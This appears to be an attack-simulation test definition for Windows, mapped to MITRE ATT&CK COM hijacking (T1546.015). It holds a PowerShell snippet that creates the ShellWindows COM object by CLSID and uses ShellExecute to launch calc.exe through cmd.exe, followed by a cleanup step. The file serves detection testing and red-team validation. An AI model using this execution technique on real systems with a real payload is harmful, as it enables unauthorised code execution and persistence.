api_version: "2.0"
name: Powershell Execute COM Object
description: |-
    Use the PowerShell to execute COM CLSID object.
    Reference: https://pentestlab.blog/2020/05/20/persistence-com-hijacking/
uuid: 752191b1-7c71-445c-9dbe-21bb031b18eb
mitre:
    tactics:
        - 'TA0004: Privilege Escalation'
        - 'TA0003: Persistence'
    techniques:
        - 'T1546: Event Triggered Execution'
    subtechniques:
        - 'T1546.015: Component Object Model Hijacking'
requirements:
    platforms:
        - os: windows
steps:
    - name: powershell-execute-com-object
      inline: |
        $o= [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39"))
        $item = $o.Item()
        $item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
      executor: powershell
      cleanup:
        inline: |
            Get-Process -Name "*calc" | Stop-Process
        executor: powershell
